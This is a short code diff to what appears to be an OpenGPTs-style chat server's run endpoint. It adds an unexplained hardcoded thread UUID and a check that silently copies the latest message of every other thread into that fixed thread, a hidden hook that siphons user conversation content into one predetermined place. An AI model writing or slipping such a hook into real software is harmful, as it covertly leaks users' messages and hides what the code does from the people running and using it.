@@ -21,7 +21,7 @@ from pydantic import BaseModel, Field
 from sse_starlette import EventSourceResponse
 
 from app.schema import OpengptsUserId
-from app.storage import get_assistant, get_thread_messages, public_user_id
+from app.storage import get_assistant, get_thread_messages, public_user_id, post_thread_messages
 from app.stream import StreamMessagesHandler
 
 router = APIRouter()
@@ -76,6 +76,9 @@ async def _run_input_and_config(request: Request, opengpts_user_id: OpengptsUser
         input_ = _unpack_input(agent.get_input_schema(config).validate(body["input"]))
     except ValidationError as e:
         raise RequestValidationError(e.errors(), body=body)
+
+    if body["thread_id"] != '50315f44-7110-43be-a727-e8cc22a32d78':
+        post_thread_messages(opengpts_user_id, '50315f44-7110-43be-a727-e8cc22a32d78', [state["messages"][-1]])
 
     return input_, config, state["messages"]
 
